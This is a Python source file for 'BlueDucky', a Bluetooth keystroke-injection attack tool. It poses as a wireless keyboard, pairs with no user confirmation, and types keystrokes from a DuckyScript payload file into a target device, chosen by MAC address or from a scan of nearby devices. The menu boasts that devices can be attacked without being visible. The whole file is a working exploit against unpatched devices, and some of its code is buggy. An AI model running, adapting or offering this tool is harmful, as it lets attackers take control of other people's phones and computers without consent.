import bluetooth
import dbus
import dbus.service
import dbus.mainloop.glib
import logging as log
from multiprocessing import Process
from threading import Thread
import time
import binascii
from gi.repository import GLib
from enum import Enum
import subprocess
from pydbus import SystemBus
import sys
import os
import re
import string

child_processes = []

def print_blue_ascii_art():
    blue_color_code = "\033[34m"  # ANSI escape code for blue text
    reset_color_code = "\033[0m"  # ANSI escape code to reset text color

    ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣄⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡶⠟⠛⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⠛⠷⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢷⣤⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀⢹⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⣷⣶⠶⠛⠛⠛⠛⠳⢶⣦⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣯⠉⠉⠉⠉⠉⠛⣷⠀⠀⢿⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⢀⣠⣿⣀⡀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⠀⢀⣀⣀⣤⣴⠟⠀⠀⠸⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣙⣿⣿⣿⣿⣿⣿⠶⠶⠶⠿⠛⠛⠛⠛⠛⠛⢷⣦⡀⠉⠙⠛⠛⠛⠛⠛⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⣿⠀⠀⠀
⠀⢀⣠⣴⠶⠾⠛⠛⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀
⢠⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀
⠈⢿⣦⣄⣀⣀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣄⣀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀
⠀⠀⠈⠉⠛⠛⠛⢻⣟⠛⠛⠛⠛⠛⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠻⠷⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠛⠷⢶⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⠶⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢶
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣤⣤⡀⢀⣤⣤⡀⠀⣤⠀⠀⢀⣤⣄⢀⣤⣤⡀⠀⠀⣤⠀⠀⣠⠀⢀⣄⠀⠀⣠⣤⡀⠀⠀⠀⡀⠀⣠⡀⣠⣤⣤⣠⡀⠀⣤⢀⣤⣤⡀⣤⣤⡀
⢸⣯⣹⡗⣿⣿⡏⠀⣼⣿⣇⢰⡿⠉⠃⣿⣿⡍⠀⠀⠀⢿⣤⣦⣿⠀⣾⢿⡆⢾⣯⣝⡃⠀⠀⢰⣿⣆⣿⡧⣿⣽⡍⠘⣷⣸⡏⣾⣿⡯⢸⣯⣩⡿
⢸⡟⠉⠀⢿⣶⣶⢰⡿⠟⢻⡾⢷⣴⡆⢿⣶⣶⠄⠀⠀⠸⡿⠻⡿⣼⡿⠟⢿⢤⣭⣿⠟⠀⠀⢸⡇⠻⣿⠃⣿⣼⣶⠀⢻⡟⠀⢿⣧⣶⠸⣿⠻⣧
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⠀⠀⠀⠀⣀⡀⠈⢀⣀⣀⠀⣁⣀⣀⢀⡀⠀⢀⣀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⢠⣧⡀⣿⠀⠀⠀⣼⡿⢿⣄⣼⡟⢿⡿⠿⣿⠿⢻⣧⢠⡿⠿⣧⣀⣿⡄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣧⣾⡟⣷⣿⠀⠀⠘⣿⣀⣸⡟⢹⡿⠟⠁⠀⣿⡀⢸⣏⢿⣇⣠⣿⢻⣏⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠁⠀⠙⠙⠁⠘⠋⠀⠀⠀⠈⠉⠉⠀⠘⠁⠀⠀⠀⠉⠁⠈⠁⠀⠉⠉⠁⠈⠋⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""


    print(blue_color_code + ascii_art + reset_color_code)


def register_hid_profile(iface, addr):
    dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
    bus = dbus.SystemBus()
    get_obj = lambda path, iface: dbus.Interface(bus.get_object("org.bluez", path), iface)
    addr_str = addr.replace(":", "_")
    path = "/org/bluez/%s/dev_%s" % (iface, addr_str)
    manager = get_obj("/org/bluez", "org.bluez.ProfileManager1")
    profile_path = "/test/profile"
    profile = Profile(bus, profile_path)
    hid_uuid = "00001124-0000-1000-8000-00805F9B34FB"
    
    # Hardcoded XML content
    xml_content = """<?xml version="1.0" encoding="UTF-8" ?>
<record>

	<!-- ServiceRecordHandle -->
	<attribute id="0x0000">
		<uint32 value="0x00010000" />
	</attribute>

	<!-- ServiceClassIDList -->
	<attribute id="0x0001">
		<sequence>
			<uuid value="0x1124" />
		</sequence>
	</attribute>

	<!-- ProtocolDescriptorList -->
	<attribute id="0x0004">
		<sequence>

			<!-- L2CAP PSM 17 -->
			<sequence>
				<uuid value="0x0100" />
				<uint16 value="0x0011" />
			</sequence>

			<!-- HID Protocol -->
			<sequence>
				<uuid value="0x0011" />
			</sequence>
		</sequence>
	</attribute>

	<!-- BrowseGroupList -->
	<attribute id="0x0005">
		<sequence>
			<uuid value="0x1002" />
		</sequence>
	</attribute>

	<!-- LanguageBaseAttributeIDList -->
	<attribute id="0x0006">
		<sequence>
			<uint16 value="0x656e" />
			<uint16 value="0x006a" />
			<uint16 value="0x0100" />
		</sequence>
	</attribute>

	<!-- BluetoothProfileDescriptorList -->
	<attribute id="0x0009">
		<sequence>
			<sequence>
				<uuid value="0x1124" />
				<uint16 value="0x0100" />
			</sequence>
		</sequence>
	</attribute>

	<!-- AdditionalProtocolDescriptorList -->
	<attribute id="0x000d">
		<sequence>
			<sequence>

				<!-- L2CAP PSM 19 -->
				<sequence>
					<uuid value="0x0100" />
					<uint16 value="0x0013" />
				</sequence>

				<!-- HID Protocol -->
				<sequence>
					<uuid value="0x0011" />
				</sequence>
			</sequence>
		</sequence>
	</attribute>

	<!-- ServiceName -->
	<attribute id="0x0100">
		<text value="Keyboard" />
	</attribute>

	<!-- ServiceDescription -->
	<attribute id="0x0101">
		<text value="Keyboard" />
	</attribute>

	<!-- ProviderName -->
	<attribute id="0x0102">
		<text value="Keyboard" />
	</attribute>

	<!-- HID: DeviceReleaseNumber -->
	<attribute id="0x0200">
		<uint16 value="0x0148" />
	</attribute>

	<!-- HID: ParserVersion -->
	<attribute id="0x0201">
		<uint16 value="0x0111" />
	</attribute>

	<!-- HID: DeviceSubclass -->
	<attribute id="0x0202">
		<uint8 value="0x40" />
	</attribute>

	<!-- HID: CountryCode -->
	<attribute id="0x0203">
		<uint8 value="0x21" />
	</attribute>

	<!-- HID: VirtualCable -->
	<attribute id="0x0204">
		<boolean value="true" />
	</attribute>

	<!-- HID: ReconnectInitiate -->
	<attribute id="0x0205">
		<boolean value="true" />
	</attribute>

	<!-- HID: DescriptorList -->
	<attribute id="0x0206">
		<sequence>
			<sequence>
				<uint8 value="0x22" />
				<text encoding="hex" value="05010906a101850105071500250119e029e775019508810295057501050819012905910295017503910395087501150025010600ff09038103950675081500256505071900296581009501750115002501050c09008101950175010601ff09038102050c09409501750181029501750581030602ff09558555150026ff0075089540b1a2c00600ff0914a101859005847501950315002501096105850944094681029505810175089501150026ff0009658102c00600ff094ba1010600ff094b150026ff008520956b75088102094b852196890275088102094b8522953e75088102c0" />
			</sequence>
		</sequence>
	</attribute>

	<!-- HID: LangIDBaseList -->
	<attribute id="0x0207">
		<sequence>
			<sequence>
				<uint16 value="0x0409" />
				<uint16 value="0x0100" />
			</sequence>
		</sequence>
	</attribute>

	<!-- HID: BatteryPower -->
	<attribute id="0x0209">
		<boolean value="true" />
	</attribute>

	<!-- HID: RemoteWakeup -->
	<attribute id="0x020a">
		<boolean value="true" />
	</attribute>

	<!-- HID: ProfileVersion -->
	<attribute id="0x020b">
		<uint16 value="0x0100" />
	</attribute>

	<!-- HID: SupervisionTimeout -->
	<attribute id="0x020c">
		<uint16 value="0x0fa0" />
	</attribute>

	<!-- HID: NormallyConnectable -->
	<attribute id="0x020d">
		<boolean value="true" />
	</attribute>

	<!-- HID: BootDevice -->
	<attribute id="0x020e">
		<boolean value="true" />
	</attribute>
</record>"""

    opts = {"ServiceRecord": xml_content}
    log.debug("calling RegisterProfile")
    manager.RegisterProfile(profile, hid_uuid, opts)
    loop = GLib.MainLoop()
    try:
        log.debug("running dbus loop")
        loop.run()
    except KeyboardInterrupt:
        log.debug("calling UnregisterProfile")
        manager.UnregisterProfile(profile)

class Profile(dbus.service.Object):
  @dbus.service.method("org.bluez.Profile1", in_signature="", out_signature="")
  def Cancel(self):
    print("Profile.Cancel")

class Key_Codes(Enum):
    NONE = 0x00
    a = 0x04
    b = 0x05
    c = 0x06
    d = 0x07
    e = 0x08
    f = 0x09
    g = 0x0a
    h = 0x0b
    i = 0x0c
    j = 0x0d
    k = 0x0e
    l = 0x0f
    m = 0x10
    n = 0x11
    o = 0x12
    p = 0x13
    q = 0x14
    r = 0x15
    s = 0x16
    t = 0x17
    u = 0x18
    v = 0x19
    w = 0x1a
    x = 0x1b
    y = 0x1c
    z = 0x1d
    A = 0x04
    B = 0x05
    C = 0x06
    D = 0x07
    E = 0x08
    F = 0x09
    G = 0x0a
    H = 0x0b
    I = 0x0c
    J = 0x0d
    K = 0x0e
    L = 0x0f
    M = 0x10
    N = 0x11
    O = 0x12
    P = 0x13
    Q = 0x14
    R = 0x15
    S = 0x16
    T = 0x17
    U = 0x18
    V = 0x19
    W = 0x1a
    X = 0x1b
    Y = 0x1c
    Z = 0x1d
    _1 = 0x1e
    _2 = 0x1f
    _3 = 0x20
    _4 = 0x21
    _5 = 0x22
    _6 = 0x23
    _7 = 0x24
    _8 = 0x25
    _9 = 0x26
    _0 = 0x27
    ENTER = 0x28
    ESCAPE = 0x29
    BACKSPACE = 0x2a
    TAB = 0x2b
    SPACE = 0x2c
    MINUS = 0x2d
    EQUAL = 0x2e
    LEFTBRACE = 0x2f
    RIGHTBRACE = 0x30
    BACKSLASH = 0x31
    SEMICOLON = 0x33
    QUOTE = 0x34
    BACKTICK = 0x35
    COMMA = 0x36
    DOT = 0x37
    SLASH = 0x38
    CAPSLOCK = 0x39
    F1 = 0x3a
    F2 = 0x3b
    F3 = 0x3c
    F4 = 0x3d
    F5 = 0x3e
    F6 = 0x3f
    F7 = 0x40
    F8 = 0x41
    F9 = 0x42
    F10 = 0x43
    F11 = 0x44
    F12 = 0x45
    PRINTSCREEN = 0x46
    SCROLLLOCK = 0x47
    PAUSE = 0x48
    INSERT = 0x49
    HOME = 0x4a
    PAGEUP = 0x4b
    DELETE = 0x4c
    END = 0x4d
    PAGEDOWN = 0x4e
    RIGHT = 0x4f
    LEFT = 0x50
    DOWN = 0x51
    UP = 0x52
    NUMLOCK = 0x53
    KEYPADSLASH = 0x54
    KEYPADASTERISK = 0x55
    KEYPADMINUS = 0x56
    KEYPADPLUS = 0x57
    KEYPADENTER = 0x58
    KEYPAD1 = 0x59
    KEYPAD2 = 0x5a
    KEYPAD3 = 0x5b
    KEYPAD4 = 0x5c
    KEYPAD5 = 0x5d
    KEYPAD6 = 0x5e
    KEYPAD7 = 0x5f
    KEYPAD8 = 0x60
    KEYPAD9 = 0x61
    KEYPAD0 = 0x62
    KEYPADDELETE = 0x63
    KEYPADCOMPOSE = 0x65
    KEYPADPOWER = 0x66
    KEYPADEQUAL = 0x67
    F13 = 0x68
    F14 = 0x69
    F15 = 0x6a
    F16 = 0x6b
    F17 = 0x6c
    F18 = 0x6d
    F19 = 0x6e
    F20 = 0x6f
    F21 = 0x70
    F22 = 0x71
    F23 = 0x72
    F24 = 0x73
    OPEN = 0x74
    HELP = 0x75
    PROPS = 0x76
    FRONT = 0x77
    STOP = 0x78
    AGAIN = 0x79
    UNDO = 0x7a
    CUT = 0x7b
    COPY = 0x7c
    PASTE = 0x7d
    FIND = 0x7e
    MUTE = 0x7f
    VOLUMEUP = 0x80
    VOLUMEDOWN = 0x81
    LEFTCONTROL = 0xe0
    LEFTSHIFT = 0xe1
    LEFTALT = 0xe2
    LEFTMETA = 0xe3
    RIGHTCONTROL = 0xe4
    RIGHTSHIFT = 0xe5
    RIGHTALT = 0xe6
    RIGHTMETA = 0xe7
    MEDIAPLAYPAUSE = 0xe8
    MEDIASTOPCD = 0xe9
    MEDIAPREV = 0xea
    MEDIANEXT = 0xeb
    MEDIAEJECTCD = 0xec
    MEDIAVOLUMEUP = 0xed
    MEDIAVOLUMEDOWN = 0xee
    MEDIAMUTE = 0xef
    MEDIAWEBBROWSER = 0xf0
    MEDIABACK = 0xf1
    MEDIAFORWARD = 0xf2
    MEDIASTOP = 0xf3
    MEDIAFIND = 0xf4
    MEDIASCROLLUP = 0xf5
    MEDIASCROLLDOWN = 0xf6
    MEDIAEDIT = 0xf7
    MEDIASLEEP = 0xf8
    MEDIACOFFEE = 0xf9
    MEDIAREFRESH = 0xfa
    MEDIACALC = 0xfb

class ConnectionFailureException(Exception):
    pass

class Adapter:
  def __init__(self, iface):
    self.iface = iface
    self.bus = SystemBus()
    try:
      self.adapter = self.bus.get("org.bluez", "/org/bluez/%s" % iface)
    except KeyError:
      log.error("Unable to find adapter '%s', aborting." % iface)
      sys.exit(1)
    self.reset()

  def enable_ssp(self):
    run(["sudo", "btmgmt", "--index", self.iface, "io-cap", "1"])
    run(["sudo", "btmgmt", "--index", self.iface, "ssp", "1"])

  def disable_ssp(self):
    run(["sudo", "btmgmt", "--index", self.iface, "ssp", "0"])

  def set_name(self, name):
    if self.adapter.Name != name:
      run(["sudo", "hciconfig", self.iface, "name", name])
      if name not in run(["hciconfig", self.iface, "name"]).decode():
        log.error("Unable to set adapter name, aborting.")
        sys.exit(1)

  def set_class(self, adapter_class):
    class_hex = "0x%06x" % adapter_class
    if self.adapter.Class != class_hex:
      run(["sudo", "hciconfig", self.iface, "class", class_hex])
      if class_hex not in run(["hciconfig", self.iface, "class"]).decode():
        log.error("Unable to set adapter class, aborting.")
        sys.exit(1)

  def set_address(self, address):
    run(["sudo", "bdaddr", "-i", self.iface, address])
    self.reset()
    if address.upper() not in run(["hciconfig", self.iface]).decode():
      log.error("Unable to set adapter address, aborting.")
      sys.exit(1)

  def down(self):
    self.adapter.Powered = False

  def up(self):
    self.adapter.Powered = True

  def reset(self):
    self.down()
    self.up()

class Agent(dbus.service.Object):
  @dbus.service.method("org.bluez.Agent1", in_signature="", out_signature="")
  def Cancel(self):
    log.debug("Agent.Cancel")

class PairingAgent:
  def __init__(self, iface, target_addr):
    self.iface = iface
    self.target_addr = target_addr
    dev_name = "dev_%s" % target_addr.upper().replace(":", "_")
    self.target_path = "/org/bluez/%s/%s" % (iface, dev_name)

  def __enter__(self):
    self.agent = Process(target=agent_loop, args=(self.target_path,))
    self.agent.start()
    time.sleep(0.25)

  def __exit__(self, a, b, c):
    self.agent.kill()
    time.sleep(0.25)

class L2CAPClient:
    def __init__(self, addr, port):
        self.addr = addr
        self.port = port
        self.connected = False
        self.sock = None

    def encode_keyboard_input(*args):
        keycodes = []
        modifiers = 0
        for a in args:
            if isinstance(a, Key_Codes):
                if a in [Key_Codes.LEFTSHIFT, Key_Codes.RIGHTSHIFT, 
                         Key_Codes.LEFTCONTROL, Key_Codes.RIGHTCONTROL, 
                         Key_Codes.LEFTALT, Key_Codes.RIGHTALT, 
                         Key_Codes.LEFTMETA, Key_Codes.RIGHTMETA]:
                    # Set the bit for the modifier
                    modifiers |= a.value
                else:
                    keycodes.append(a.value)
        assert(len(keycodes) <= 6)
        keycodes += [0] * (6 - len(keycodes))
        report = bytes([0xa1, 0x01, modifiers, 0x00] + keycodes)
        log.debug(f"{report}")
        return report

    def close(self):
        if self.connected:
            self.sock.close()
        self.connected = False
        self.sock = None

    def send(self, data):
        log.debug(f"[TX-{self.port}] Attempting to send data: {binascii.hexlify(data).decode()}")
        timeout = 0.1
        start = time.time()
        while (time.time() - start) < timeout:
            try:
                self.sock.send(data)
                log.debug(f"[TX-{self.port}] Data sent successfully")
                return
            except bluetooth.btcommon.BluetoothError as ex:
                log.error(f"[TX-{self.port}] BluetoothError: {ex}")
                if ex.errno != 11:  # no data available
                    raise ex
                time.sleep(0.001)
            except Exception as ex:
                log.error(f"[TX-{self.port}] Exception: {ex}")
                self.connected = False
        log.error(f"[TX-{self.port}] ERROR! Timed out sending data")

    def recv(self, timeout=0):
        start = time.time()
        while True:
            raw = None
            if not self.connected:
                return None
            if self.sock is None:
                return None
            try:
                raw = self.sock.recv(64)
                if len(raw) == 0:
                    self.connected = False
                    return None
                log.debug(f"[RX-{self.port}] Received data: {binascii.hexlify(raw).decode()}")
            except bluetooth.btcommon.BluetoothError as ex:
                if ex.errno != 11:  # no data available
                    raise ex
                else:
                    if (time.time() - start) < timeout:
                        continue
            return raw

    def connect(self, timeout=None):
        log.debug(f"Attempting to connect to {self.addr} on port {self.port}")
        log.debug("connecting to %s on port %d" % (self.addr, self.port))
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(timeout)
        try:
            sock.connect((self.addr, self.port))
            sock.setblocking(0)
            self.sock = sock
            self.connected = True
            log.debug("SUCCESS! connected on port %d" % self.port)
        except Exception as ex:
            self.connected = False
            log.error("ERROR connecting on port %d: %s" % (self.port, ex))
            raise ConnectionFailureException(f"Connection failure on port {self.port}")

        return self.connected

    def send_keyboard_report(self, *args):
        self.send(self.encode_keyboard_input(*args))

    def send_keypress(self, *args, delay=0.05):
      self.send_keyboard_report(*args)
      time.sleep(0.05)
      self.send_keyboard_report()
      time.sleep(0.05)

class L2CAPConnectionManager:
    def __init__(self, target_address):
        self.target_address = target_address
        self.clients = {}

    def create_connection(self, port):
        client = L2CAPClient(self.target_address, port)
        self.clients[port] = client
        return client

    def connect_all(self):
        success_count = 0
        for port, client in self.clients.items():
            if client.connect():
                success_count += 1
            else:
                log.debug(f"Failed to connect on port {port}")
        return success_count

    def close_all(self):
        for client in self.clients.values():
            client.close()

def run(command):
  assert(isinstance(command, list))
  log.debug("executing '%s'" % " ".join(command))
  return subprocess.check_output(command, stderr=subprocess.PIPE)

def restart_bluetooth_daemon():
    run(["sudo", "service", "bluetooth", "restart"])
    time.sleep(0.5)

def clear_screen():
    os.system('clear')

def agent_loop(target_path):
  dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
  loop = GLib.MainLoop()
  bus = dbus.SystemBus()
  path = "/test/agent"
  agent = Agent(bus, path)
  agent.target_path = target_path
  obj = bus.get_object("org.bluez", "/org/bluez")
  manager = dbus.Interface(obj, "org.bluez.AgentManager1")
  manager.RegisterAgent(path, "NoInputNoOutput")
  manager.RequestDefaultAgent(path)
  log.debug("'NoInputNoOutput' pairing-agent is running")
  loop.run()

# Function to load known devices from a file
def load_known_devices(filename='known_devices.txt'):
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return [tuple(line.strip().split(',')) for line in file]
    else:
        return []

# Function to save discovered devices to a file
def save_devices_to_file(devices, filename='known_devices.txt'):
    with open(filename, 'w') as file:
        for addr, name in devices:
            file.write(f"{addr},{name}\n")

# Function to scan for devices
def scan_for_devices():
    main_menu()

    # Load known devices
    known_devices = load_known_devices()
    if known_devices:
        print("\nKnown devices:")
        for idx, (addr, name) in enumerate(known_devices):
            print(f"{idx + 1}: Device Name: {name}, Address: {addr}")

        use_known_device = input("\nDo you want to use one of these known devices? (yes/no): ")
        if use_known_device.lower() == 'yes':
            device_choice = int(input("Enter the number of the device: "))
            return [known_devices[device_choice - 1]]

    # Normal Bluetooth scan
    print("\nAttempting to scan now...")
    nearby_devices = bluetooth.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=True)
    device_list = []

    if len(nearby_devices) == 0:
        print("\nNo nearby devices found.")
    else:
        print("\nFound {} nearby device(s):".format(len(nearby_devices)))
        for idx, (addr, name, _) in enumerate(nearby_devices):
            print(f"{idx + 1}: Device Name: {name}, Address: {addr}")
            device_list.append((addr, name))

    # Save the scanned devices only if they are not already in known devices
    new_devices = [device for device in device_list if device not in known_devices]
    if new_devices:
        known_devices += new_devices
        save_devices_to_file(known_devices)
    return device_list

def terminate_child_processes():
    for proc in child_processes:
        if proc.is_alive():
            proc.terminate()
            proc.join()

def main_menu():
    clear_screen()
    print_blue_ascii_art()
    title = "BlueDucky - Bluetooth Device Attacker"
    separator = 70 * "="
    print(separator)
    print(f"{separator}\n{title.center(len(separator))}\n{separator}")
    print("Remember, you can still attack devices without visibility...\nIf you have their MAC address")
    print(separator)

def is_valid_mac_address(mac_address):
    # Regular expression to match a MAC address in the form XX:XX:XX:XX:XX:XX
    mac_address_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    return mac_address_pattern.match(mac_address) is not None

# Function to read DuckyScript from file
def read_duckyscript(filename='payload.txt'):
    if os.path.exists(filename):
        with open(filename, 'r') as file:
            return [line.strip() for line in file.readlines()]
    else:
        log.warning(f"File {filename} not found. Skipping DuckyScript.")
        return None

# Main function
def main():
    log.basicConfig(level=log.DEBUG)
    
    main_menu()
    
    target_address = input("\nWhat is the target address? Leave blank and we will scan for you: ")

    if target_address == "":
        devices = scan_for_devices()
        if devices:
            if len(devices) > 1:  # More than one device means a scan was performed
                selection = int(input("\nSelect a device by number: ")) - 1
                if 0 <= selection < len(devices):
                    target_address = devices[selection][0]
                else:
                    print("\nInvalid selection. Exiting.")
                    return
            else:
                # Only one device, means a known device was selected
                target_address = devices[0][0]
        else:
            return
    elif not is_valid_mac_address(target_address):
        print("\nInvalid MAC address format. Please enter a valid MAC address.")
        return

    # Check if payload exists
    duckyscript = read_duckyscript()
    if not duckyscript:
        duckyscript = "Hello There"
        log.info("Payload file not found. Exiting.")
        return

    main_menu()
    print(f"Attacking {target_address}\n")

    # Display Duckyscript after reading from file
    print(f"Duckyscript after reading from file: {duckyscript}")
    payload_line = duckyscript[0].replace('STRING ', '')

    restart_bluetooth_daemon()

    profile_proc = Process(target=register_hid_profile, args=('hci0', target_address))
    profile_proc.start()
    child_processes.append(profile_proc)

    adapter = Adapter('hci0')
    adapter.set_name("Robot POC")
    adapter.set_class(0x002540)
    adapter.enable_ssp()

    try:
        # Manage connections
        connection_manager = L2CAPConnectionManager(target_address)
        sdp_client = connection_manager.create_connection(1)   # SDP
        hid_control_client = connection_manager.create_connection(17)  # HID Control
        hid_interrupt_client = connection_manager.create_connection(19)  # HID Interrupt

        with PairingAgent('hci0', target_address) as agent:
            if connection_manager.connect_all():
                client = connection_manager.clients[19]  # HID Interrupt client
                client.send_keypress('')  # Empty report
                time.sleep(0.5)
                if duckyscript == "Hello There":
                    for letter in duckyscript:
                        if letter == " ":
                            client.send_keypress(Key_Codes.SPACE)
                        else:
                            client.send_keypress(Key_Codes[letter])
                            log.info("No DuckyScript commands to execute.")
                else:
                    # Iterate through each line in duckyscript list from payload.txt
                    for line in duckyscript:
                        if line.startswith("REM"):
                            continue  # Ignore REM lines
                        elif line.startswith("STRING"):
                            text = line[7:]  # Extract text after "STRING"
                            for letter in text:
                                # Send keypress for each letter
                                if letter == " ":
                                    client.send_keypress(Key_Codes.SPACE)
                                else:
                                    client.send_keypress(Key_Codes[letter])
            else:
                raise ConnectionFailureException("Failed to connect to all required ports")
    except ConnectionFailureException as e:
        log.error(f"Connection failure: {e}")
        terminate_child_processes()
        log.debug("Device is most likely patched")
        sys.exit("Exiting script due to connection failure")

if __name__ == "__main__":
    try:
        main()
    finally:
        terminate_child_processes()
